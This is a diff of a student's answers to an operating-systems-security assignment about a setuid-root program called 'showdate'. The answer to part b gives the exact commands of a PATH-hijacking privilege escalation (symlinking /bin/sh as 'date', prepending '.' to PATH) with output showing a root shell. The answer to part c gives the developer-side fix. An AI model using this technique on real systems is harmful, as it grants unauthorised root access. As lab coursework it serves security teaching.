@@ -59,10 +59,26 @@ and run it to see system calls used by **showdate**
 	
 
 * b) Assume the role of a non-privileged attacker. Use the program *showdate* to obtain a root shell. You can verify if you succeeded by looking at the output of **id**, it should be something like: `$ /usr/bin/id` *uid=0(root) gid=0(root) groups=0(root),27(sudo),1001(test1)* Hand in the exact console commands you used to get this working.
-	* Answer:
 
-* c) Explain what a developer could do to overcome this issue. What explicit actions should a developer take when writing software that is intended to be used with *setuid-root* to avoid these typed of problems?
-	* Answer:	
+	* Answer: The solution is based on this article [Reach the Root](https://hackmag.com/security/reach-the-root/) under the **Path** section. The main idea here is that you modify the PATH variable to escalate privileges. The showdate script is invoking the date command which is not hard-coded to a specific path but can be altered inside the PATH variable which we can modifiy even without root privileges. 
+
+	```
+	testuser1@kali:/root/operating_systems_security/assignment-4$ id
+	uid=1000(testuser1) gid=1000(testuser1) groups=1000(testuser1)
+
+	testuser1@kali:/root/operating_systems_security/assignment-4$ ln -s /bin/sh date
+	testuser1@kali:/root/operating_systems_security/assignment-4$ PATH=.:${PATH}
+	testuser1@kali:/root/operating_systems_security/assignment-4$ export PATH
+	testuser1@kali:/root/operating_systems_security/assignment-4$ ./showdate
+	testuser1@kali:/root/operating_systems_security/assignment-4$ ./showdate
+	# id
+	uid=0(root) gid=0(root) groups=0(root),1000(testuser1) 
+	```
+
+	By creating a symbolic link from /bin/sh to date and then prepend the current directory to the PATH variable, the showdate script is not executing the date command but /bin/sh instead and we get our shell.
+
+* c) Explain what a developer could do to overcome this issue. What explicit actions should a developer take when writing software that is intended to be used with *setuid-root* to avoid these types of problems?
+	* Answer: A developer could hard-code the dependencies of the script into locations which are only accessable to root and do not rely on entries inside the PATH variable which can be altered by normal users.
 
 
 
